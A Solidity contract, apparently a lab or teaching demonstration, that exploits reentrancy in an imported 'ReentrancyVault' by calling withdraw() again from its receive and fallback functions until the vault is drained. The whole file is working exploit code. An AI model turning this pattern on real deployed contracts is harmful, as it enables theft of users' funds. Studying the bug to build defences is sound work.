// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./ReentrancyVault.sol";

contract MaliciousAttacker {
    ReentrancyVault public vault;

    constructor(address _vault) {
        vault = ReentrancyVault(_vault);
    }

    receive() external payable {
        // This function is called when the vault sends Ether to the attacker
        // It allows the attacker to re-enter the vault's withdraw function
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }

    fallback() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Send at least 1 ether");
        vault.deposit{value: 1 ether}();
        vault.withdraw();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
// Note: This contract is designed to exploit the ReentrancyVault contract.
// It can repeatedly call the withdraw function before the balance is set to zero, draining the vault
